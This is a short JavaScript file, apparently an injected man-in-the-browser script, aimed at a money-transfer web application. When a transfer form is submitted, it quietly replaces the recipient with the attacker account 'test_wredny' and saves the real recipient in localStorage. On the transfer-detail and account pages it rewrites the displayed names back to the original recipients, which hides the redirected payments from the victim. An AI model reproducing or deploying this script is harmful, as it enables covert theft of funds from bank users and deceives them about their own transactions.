// this is the code which will be injected into a given page...

(function() {

	window.onload = function(){
		let path = window.location.pathname
		if(path === '/transfer/'){
			$("form:first").submit(
				function(event){
					let original_user = $("input[name='receiver']").val()
					let original_money = parseFloat($("input[name='number']").val())
					window.localStorage.setItem(original_money, original_user)
					$("input[name='receiver']").val("test_wredny")
				}
			);

		}
		else if(path.includes('transfer_detail') || path.includes('transfer')){
			let receiver = $("tbody > tr > th").first().next()
			let money = receiver.next()
			if(window.localStorage.getItem(parseFloat(money))){
				receiver.text(window.localStorage.getItem(parseFloat(money)))
			}
		}
		else if(window.location.pathname.includes('account')){
			console.log("Hacking account")
			$("tbody > tr").each(function(index){
				let username = $(this).children().first().next()
				let money = parseFloat(username.next().text())
				usernam = username.text()
				if(money < 0){
					console.log(money)
					money = String(money)
					if(!String(money).includes('.')){
						money = String(money) + '.0'
						money = money.substr(1)
					}
					console.log(money)
					if(window.localStorage.getItem(money)){
						username.text(window.localStorage.getItem(money))
					}
				}
			});
		}
	}

})();